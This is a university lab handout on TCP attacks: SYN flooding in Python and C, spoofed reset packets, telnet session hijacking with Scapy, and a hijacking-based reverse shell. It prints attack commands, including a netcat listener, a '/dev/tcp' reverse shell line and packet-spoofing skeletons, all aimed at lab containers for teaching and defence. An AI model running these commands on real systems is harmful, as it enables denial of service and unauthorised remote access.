---
layout: default
course_number: CS335
title: Lab - Attacks on TCP
---

# Lab: TCP Attack

## Learning Objectives
Students will analyze real TCP vulnerabilities and perform controlled attacks to understand how design and implementation mistakes lead to security failures. Through these case studies, they will learn common vulnerability patterns, why security must be built into protocols from the start, and how secure programming and testing practices help prevent similar issues in the future. By completing the lab, students will gain practical experience with:
- The structure and behavior of the TCP protocol
- TCP SYN flood attacks and the role of SYN cookies
- TCP reset attacks
- TCP session hijacking
- Reverse shells
This foundation prepares students to recognize, avoid, and defend against protocol‑level vulnerabilities in real systems. 

---

## Lab Environment 
Setup files: [Labsetup.zip](.\tcp\Labsetup.zip)

In this lab, you can use either the VM or the attacker container as the attack machine. The attacker container is configured differently for two reasons:
- **Shared folder**: Editing code is easier in the VM, so a shared folder is mounted between the VM and the attacker container using Docker volumes (`./volumes` on the VM mapped to `/volumes` in the container). Any code placed in `./volumes` on the VM is immediately available inside the container.
- **Host network mode**: Packet sniffing inside a normal container doesn’t work because it only sees its own virtual‑switch traffic. The attacker container uses `network_mode: host`, allowing it to see all network interfaces and traffic from the host VM.

In this lab, we need to telnet from one container to another. We have already created an account called `seed` inside all the containers. Its password is `dees`. You can _telnet_ to all containers into this account.

--- 

## Ethical Use Notice
This lab is intended **solely for educational use within a controlled environment**. The techniques demonstrated must **never** be used on systems you do not own or lack explicit authorization to test.

---

## Task 1: SYN Flooding Attack

### 1.1 Launching a SYN Flood Using Python
You will complete the following [synflood.py](..\notes\tcp\synflood.txt) script to generate spoofed TCP SYN packets. The script must randomize:
- Source IP address  
- Source port  
- TCP sequence number  

After running the attack for at least one minute, attempt to telnet into the victim server to observe whether the SYN backlog queue becomes full and blocks legitimate connections.

Key factors to investigate:

- **TCP cache behavior ("proven destinations")**  
  Ubuntu 20.04 reserves part of the backlog for previously successful connections. This can allow some clients to connect even during an attack. You can flush this cache using:  
  `ip tcp_metrics flush`

- **TCP retransmissions**  
  The victim retransmits SYN+ACK packets several times (`tcp_synack_retries`). Each retransmission timeout frees a slot in the half‑open queue, reducing attack effectiveness.

- **Attack speed**  
  Python may not generate packets fast enough. Running multiple instances of the script increases pressure on the queue.

- **Queue size**  
  Adjust `tcp_max_syn_backlog` to see how queue capacity affects the attack.  
  Example:  
  `sysctl -w net.ipv4.tcp_max_syn_backlog=80`

- **Monitoring queue usage**  
  Use one of the following to count half‑open connections (SYN_RECV):  
  - `netstat -tna | grep SYN_RECV | wc -l`  
  - `ss -n state syn-recv sport=:23 | wc -l`

This task helps you understand how SYN flooding works and why system behavior, kernel mitigations, and packet rate all influence attack success.

---

### 1.2 Launching a SYN Flood Using C
Compile and run the provided `synflood.c` program. This version sends spoofed SYN packets much faster than Python due to lower overhead and direct packet construction.

Steps:
1. Compile on the VM:  
   `gcc -o synflood synflood.c`  
   (Apple Silicon: `gcc -static -o synflood synflood.c`)
2. Run from the attacker container:  
   `./synflood 10.9.0.5 23`

Compare the results with the Python attack and explain why the C implementation is more effective (e.g., speed, efficiency, fewer delays).

---

### 1.3 Testing the SYN Cookie Defense
Enable SYN cookies on the victim server using:  
`sysctl -w net.ipv4.tcp_syncookies=1`

Then rerun your attacks and compare:
- Whether the backlog still fills  
- Whether legitimate connections succeed  
- How SYN cookies change the victim’s behavior  

This demonstrates how SYN cookies mitigate SYN flooding by avoiding reliance on the backlog queue.

---

## Task 2: TCP RST Attack on Telnet Connections
You will terminate an active telnet session between two containers by crafting a spoofed TCP RST packet.

Steps:
1. Use Wireshark to capture existing telnet session and extract:  
   - Source IP  
   - Destination IP  
   - Source port  
   - Destination port  
   - Correct sequence number  

2. Use Scapy to craft a RST packet with these values.

Example skeleton:
```python
ip = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="R", seq=@@@@)
send(ip/tcp, verbose=0)
```

**Extra Credit**:  
Automate the attack using sniff‑and‑spoof logic so the script detects telnet packets and injects RST packets automatically.

--- 

## Task 3: TCP Session Hijacking

The goal of this task is to hijack an existing TCP (telnet) session between two victim machines by injecting spoofed packets that appear to come from the legitimate client. By crafting a TCP packet with the correct sequence and acknowledgment numbers, you can cause the telnet server to execute commands supplied by the attacker.

### What you need to do
- Capture the active telnet session using Wireshark.
- Identify the required TCP fields:
  - Source IP and destination IP
  - Source port and destination port
  - Current sequence number
  - Current acknowledgment number
- Construct a spoofed TCP packet using Scapy with:
  - `flags="A"` (ACK)
  - Correct sequence and acknowledgment numbers
  - A payload containing a malicious command
- Send the packet so the telnet server interprets it as legitimate input from the client.

### Example Scapy skeleton
```python
from scapy.all import *

ip = IP(src="@@@@", dst="@@@@")
tcp = TCP(sport=@@@@, dport=@@@@, flags="A", seq=@@@@, ack=@@@@)
data = "@@@@"   # malicious command
pkt = ip/tcp/data
send(pkt, verbose=0)
```

**Extra Credit**
Automate the attack using a sniff‑and‑spoof approach:
- Sniff packets from the telnet session.
- Extract sequence/ack numbers dynamically.
- Inject malicious packets automatically.

---

## Task 4: Creating a Reverse Shell Using TCP Session Hijacking

This task builds on Task 3 by using session hijacking to inject a **reverse shell** command into the victim’s telnet session. Instead of running a single command, the attacker establishes an interactive shell on the victim machine.

### Goal 
Use TCP session hijacking to execute a reverse shell command on the victim, causing it to connect back to the attacker and provide remote shell access.

### What you need to do
1. On the attacker machine, start a listener:
```bash
nc -lnv 9090
```
2. Craft a spoofed TCP packet (as in Task 3) that injects a reverse shell command into the telnet session.
```bash
/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1
```

3. Inject this command into the active telnet session using Scapy.

4. When the command executes, the victim machine connects back to the attacker’s listener, providing an interactive shell.

### Why this matters
This task illustrates how:
- A single injected command can escalate into full interactive access.
- Session hijacking can lead to long‑term compromise if not mitigated.
- Strong authentication, encrypted channels, and unpredictable TCP state are essential for preventing such attacks.

--- 

### Grading

- Post your report in <a href="https://cs.ycp.edu/marmoset" target="_blank">Marmoset</a> by the scheduled due date in the syllabus. Your grade for this lab will be composed of:
- You need to submit a detailed lab report, with **screenshots**, to describe what you have done and what you have observed. You also need to provide explanation to the observations that are interesting or surprising. Please also list the important code snippets followed by explanation. Simply attaching code without any explanation will not receive credits.
  - 30% - Design:  The overall quality and structure of your exploit.
  - 30% - Observations: Insightfulness and depth in your understanding of the task
  - 40% - Explanation: Clarity and completeness of your report and analysis.
  - *Extra Credit*: Additional investigation beyond the requirements.
